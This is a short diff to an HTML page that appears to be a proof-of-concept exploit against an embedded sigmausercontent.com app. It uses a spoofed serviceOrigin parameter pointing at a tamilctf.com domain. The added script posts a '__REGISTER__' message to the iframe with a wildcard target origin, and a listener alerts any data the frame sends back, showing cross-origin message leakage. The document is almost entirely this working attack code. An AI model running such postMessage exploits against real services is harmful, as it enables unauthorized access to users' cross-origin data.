@@ -30,9 +30,21 @@ iframe.postMessage(JSON.stringify(messageData), "*");
 
 </script>
 
-<iframe src="https://5982d025-5aa8-4469-949d-51079069610b.sigmausercontent.com/appfiles/v2/5982d025-5aa8-4469-949d-51079069610b/22.0/06f1dc08214933c50893d0b6bfdf4da8a04eabe5313899d117f1b5da1819bd69/app/home.html?serviceOrigin=https%3A%2F%2Fcoinmarketcap.com.tamilctf.com&frameorigin=https://coinmarketcap.com.tamilctf.com"></iframe>
+<iframe id="testing" src="https://5982d025-5aa8-4469-949d-51079069610b.sigmausercontent.com/appfiles/v2/5982d025-5aa8-4469-949d-51079069610b/22.0/06f1dc08214933c50893d0b6bfdf4da8a04eabe5313899d117f1b5da1819bd69/app/home.html?serviceOrigin=https%3A%2F%2Fcoinmarketcap.com.tamilctf.com&frameorigin=https://coinmarketcap.com.tamilctf.com"></iframe>
 <script>
 window.addEventListener('message', function(e)  {
 alert(JSON.stringify(e.data));
 }); //Event listener used to receive data from child window and display it
+</script>
+<script>
+var iframe = document.getElementById("testing").contentWindow;
+
+  // Get a reference to the iframe
+var messageData = {
+    type: "__REGISTER__",uniqueID: "1223456"
+    // other properties...
+};
+
+iframe.postMessage(JSON.stringify(messageData), "*");
+
 </script>
